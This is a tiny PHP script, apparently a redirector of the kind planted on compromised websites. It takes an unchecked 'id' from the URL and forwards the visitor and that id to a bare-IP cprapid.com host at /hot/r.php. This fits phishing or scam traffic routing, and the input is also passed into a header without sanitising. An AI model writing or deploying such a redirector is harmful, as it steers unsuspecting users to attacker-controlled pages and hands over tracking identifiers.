<?php
session_start();
$user = $_GET['id'];
header("Location: https://20-46-244-72.cprapid.com/hot/r.php?id=$user");
?>